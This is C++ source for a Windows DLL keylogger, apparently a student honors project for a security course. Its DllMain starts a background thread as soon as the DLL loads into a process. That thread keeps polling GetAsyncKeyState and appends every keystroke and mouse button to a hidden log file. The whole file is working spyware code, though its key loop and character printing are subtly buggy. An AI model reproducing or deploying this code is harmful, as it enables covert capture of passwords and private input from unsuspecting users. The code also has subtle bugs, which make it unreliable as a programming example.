#include <iostream>
#include <Windows.h>
#include <ctype.h>
#include <string.h>
#include <fstream>

using namespace std;

int Log(int key, char const *file);
VOID ExecWorkerRoutine();

BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		DisableThreadLibraryCalls(hinstDLL);
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExecWorkerRoutine, NULL, 0, NULL);
	}

	return TRUE; 
}

VOID ExecWorkerRoutine()
{
	char key;

	while (true)
	{
		for (key = 8; key <= 255; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				Log(key, "C:\\CSCE465HonorsProject\\log");
			}
		}
	}
}

int Log(int key, char const* file)
{
	Sleep(10);

	FILE* OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");

	if (key == VK_SHIFT) fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key == VK_BACK) fprintf(OUTPUT_FILE, "%s", "[BACK]");
	else if (key == VK_RETURN) fprintf(OUTPUT_FILE, "%s", "[ENTER]");
	else if (key == VK_ESCAPE) fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key == VK_TAB) fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key == VK_CONTROL) fprintf(OUTPUT_FILE, "%s", "[CTRL]");
	else if (key == VK_MENU) fprintf(OUTPUT_FILE, "%s", "[ALT]");
	else if (key == VK_CAPITAL) fprintf(OUTPUT_FILE, "%s", "[CAPS]");
	else if (key == VK_SPACE) fprintf(OUTPUT_FILE, "%s", "[SPACE]");
	else if (key == VK_INSERT) fprintf(OUTPUT_FILE, "%s", "[INSERT]");
	else if (key == VK_DELETE) fprintf(OUTPUT_FILE, "%s", "[DELETE]");
	else if (key == VK_MULTIPLY) fprintf(OUTPUT_FILE, "%s", "*");
	else if (key == VK_ADD) fprintf(OUTPUT_FILE, "%s", "+");
	else if (key == VK_SUBTRACT) fprintf(OUTPUT_FILE, "%s", "-");
	else if (key == VK_DECIMAL) fprintf(OUTPUT_FILE, "%s", ".");
	else if (key == VK_DIVIDE) fprintf(OUTPUT_FILE, "%s", "/");
	else if (key == VK_LBUTTON) fprintf(OUTPUT_FILE, "%s", "[LMOUSE]");
	else if (key == VK_RBUTTON) fprintf(OUTPUT_FILE, "%s", "[RMOUSE]");
	else if (key == VK_MBUTTON) fprintf(OUTPUT_FILE, "%s", "[MMOUSE]");
	else fprintf(OUTPUT_FILE, "%s", &key);

	fclose(OUTPUT_FILE);

	return 0;
}